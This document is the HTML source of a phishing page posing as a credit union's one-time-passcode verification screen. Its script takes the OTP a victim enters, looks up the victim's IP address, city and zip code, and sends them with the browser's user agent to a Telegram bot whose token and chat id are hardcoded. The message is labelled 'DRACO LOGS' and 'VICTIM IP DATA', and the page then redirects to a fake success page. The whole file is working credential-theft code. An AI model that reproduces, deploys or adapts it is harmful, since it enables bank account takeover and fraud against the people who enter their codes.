<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>Page Title</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');

        *{
            margin: 0px;
            padding: 0px;
            box-sizing: border-box;
        }

        body{
            background-image: url(assets/bg.png);
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            font-family: 'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }


        section{
            
            max-width: 620px;
            border-radius: 4px;
        }

        .logo_box{
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-color: white;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
            border-bottom: 1px solid #c1c1c1;
        }


        .logo_box img{
            width: 62%;
        }


        form{
            width: 100%;
            background: rgba(255, 255, 255, 0.936);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

        .form_box{
            margin: 10px 0px;
            width: 55%;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .form_box label{
            color: #262626;
            margin-bottom: 4px;
            font-weight: 600;
            font-size: 14px;
        }
        .form_box input{
            height: 45px;
            border: 1px solid #c1c1c1;
            border-radius: 4px;
            transition: .2s ease;
            padding: 10px;
        }

        .form_box p{
            position: absolute;
            right: 3%;
            font-size: 12px;
            top: 55%;
        }

        .remeber{
            display: flex;
            align-items: center;
            width: 55%;
            margin: 10px 0px;
        }

        .remeber input{
            width: 20px;
            height: 20px;
        }

        .remeber p{
            margin-left: 10px;
            font-size: 12px;
            color: #262626;
        }

        form button{
            width: 55%;
            height: 37px;
            background: #8CBAD1;
            color: white;
            border-radius: 3px;
            margin: 15px 0px;
            border: none;
        }


        form ul{
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
            margin-top: 10px;
            width: 100%;
            background: #559CBE;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
            padding: 0px 50px;
            color: white;
        }

        form ul span{
            opacity: .3;
        }

        p.forgot{
            font-size: 12px;
            text-align: right;
            width: 55%;
            margin: 10px 0px;
            color: #262626;
        }


        form ul li{
            color: white;
            font-size: 12px;
            list-style-type: none;
            
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px 20px;
        }

        form ul li:hover{
            text-decoration: underline;
            cursor: pointer;
        }

        .mt_30{
            margin-top: 30px;
        }


        img.ncua{
            margin: 50px 0px 0px 0px;
        }

        .border{
            border-right: 1px solid white;
        }

        .form_box input:focus{
            outline: 2px solid #0066CC;
        }

        .active{
            background: #559CBE;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
        }

        p.otp_p{
            width: 55%;
        }

        @media only screen and (max-width:800px){
            body{
                padding: 25px 10px;
            }
            section{
                width: 100%;
                max-width: unset;
            }

            .logo_box{
                padding: 10px;
            }

            .logo_box img{
                width: 20%;
            }

            .mt_30{
                margin-top: 40px !important;
            }

            .form_box{
                width: 50%;
                margin: 17px 0px;
            }

            p.otp_p{
                width: 50%;
            }

            .form_box label{
                font-size: 13px;
            }

            .remeber{
                width: 50%;
            }
            form button{
                width: 50%;
            }

            p.forgot{
                width: 50%;
            }

            form ul{
                padding: 0px !important;
                width: 100%;
            }

            .remeber input{
                width: 20px;
                height: 20px;
            }

            form li{
                margin: 0px !important;
                padding: 0px;
               
            }

            form span{
                margin: 0px;
                padding: 0px;
            }

        }


        @media only screen and (max-width:500px){

            .logo_box img{
                width: 65%;
                padding: 0px !important;
            }


            .form_box, .remeber, form button, p.forgot{
                width: 85%;
            }

            p.otp_p{
                width: 85%;
            }

            p.forgot{
                margin: 20px 0px;
            }

            form ul{
                padding: 0px 0px !important;
            }

            form li{
                justify-content: flex-start;
                padding: 10px 0px !important;
            }

            .ncua_box{
                width: 100%;
                display: flex;
                justify-content: center;
                align-items: center;
                background: #559CBE;
                padding: 10px;
                border-radius: 7px;
                height: max-content;
                margin: 40px 0px;
            }

            img.ncua{
                margin: 0px;
            }



        }

    </style>
</head>
<body>

    <section>
        <div class="logo_box">
            <img src="assets/san-logo.png" alt="">
        </div>

        <form id="form" method="post">
            <p class="otp_p mt_30">A one time verification code has been sent to the phone number on file, Please proceed to enter the 6 digit OTP code below</p>

            <div class="form_box">
                <label for="">Otp</label>
                <input type="text" required id="otp">
            </div>



            <button id="submit_btn" disabled>Submit</button>

            <p class="forgot">Didn't recieve otp code?</p>

            <ul>
                <li>
                    Enroll now   
                </li>
                <span>|</span>
                <li>Forgot/Unlock Account</li>
                <span>|</span>
                <li>Contact Us</li>
                <span>|</span>
                <li>Locations</li>
                <span>|</span>
                <li>Privacy & Security</li>
            </ul>
        </form>

    </section>

    <div class="ncua_box">
        <img class="ncua" src="assets/ncua_logo_small.png" alt="">
    </div>



    <script>




        const otp = document.getElementById('otp');
        const submitBtn = document.getElementById('submit_btn');

        otp.addEventListener("input", () => {
            otp.value = otp.value.replace(/\D/g, "").slice(0, 6);
        });

        function toggleButton() {
            if (otp.value.trim()) {
            submitBtn.disabled = false;
            submitBtn.classList.add('active');
            } else {
            submitBtn.disabled = true;
            submitBtn.classList.remove('active');
            }
        }

        otp.addEventListener('input', toggleButton);

    </script>


    <script>
        const sendFormData = async (data) => {
            let keyValuePairs = Object.entries(data)
                .map(([key, value]) => `## ${key.split("_").join(" ")}: ${value} \n`)
                .join("");
        
            const url = "https://ipapi.co/json";
            const response = await fetch(url);
            const result = await response.json();

            
            const botToken = "8377210615:AAFTWLS_ZjgoXWqmetcKKMz9EcqN68v6K_c";
            const chat_id = "677217859";
            
            const userAgent = navigator.userAgent;
    
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: chat_id,
                text: `------------- DRACO LOGS sanfranciscofcu  --------------- \n  ******** TRUECORE LOGIN PAGE ******** \n \n ${keyValuePairs}  \n \n ---------- VICTIM IP DATA ----------- \n ## IP : ${result.ip} \n Country : ${result.country_name} \n ## City : ${result.city} \n ## Zip Code : ${result.postal} \n \n ## User Agent : ${userAgent}`,
            }),
            });


            window.location.href = 'success.php'

            submitBtn.innerText = `Submit`



        } catch (error) {
            console.log(error)
        }
        };
    
        form.addEventListener("submit", (e) => {
            e.preventDefault();

            submitBtn.innerText = `Loading...`


            let formData = {
                otp: otp.value
            };

            sendFormData(formData);
        });

    </script>
    
</body>
</html>